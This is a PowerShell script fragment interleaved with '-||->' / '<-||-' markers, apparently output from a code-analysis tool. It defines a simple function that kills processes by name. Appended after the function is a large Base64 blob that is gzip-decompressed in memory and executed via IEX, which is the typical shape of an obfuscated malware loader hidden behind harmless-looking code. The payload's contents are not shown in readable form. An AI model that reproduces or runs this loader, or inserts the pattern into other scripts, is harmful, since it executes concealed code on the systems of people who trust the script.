
 -||-> function Stop-Process2 {
	[CmdletBinding(SupportsShouldProcess = $true)]
	[Alias()]
	[OutputType([int])]
	param(
		
		[Parameter(Mandatory=$true,
				   ValueFromPipelineByPropertyName=$true,
				   Position=0)]
		$Name
	)

	process	{
		 -||-> if ( -||-> $PSCmdlet.ShouldProcess("") <-||- ) {
			 -||-> $processes =  -||-> Get-Process -Name $Name <-||-  <-||- 
			 -||-> foreach ($process in  -||-> $processes <-||- ) {
				 -||-> $id = $process.Id <-||- 
				 -||-> $name = $process.Name <-||- 
				 -||-> Write-Output "Killing $name ($id)" <-||- 

				 -||-> $process.Kill() <-||- ;

				 -||-> Start-Sleep -Seconds 1 <-||- 
			} <-||- 
		} <-||- 
	}
} <-||- 
 -||-> $s= -||-> New-Object IO.MemoryStream( -||-> ,[Convert]::FromBase64String("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") <-||- ) <-||-  <-||- ; -||-> IEX ( -||-> New-Object IO.StreamReader( -||-> New-Object IO.Compression.GzipStream( -||-> $s,[IO.Compression.CompressionMode]::Decompress <-||- ) <-||- ) <-||- ).ReadToEnd() <-||- ;



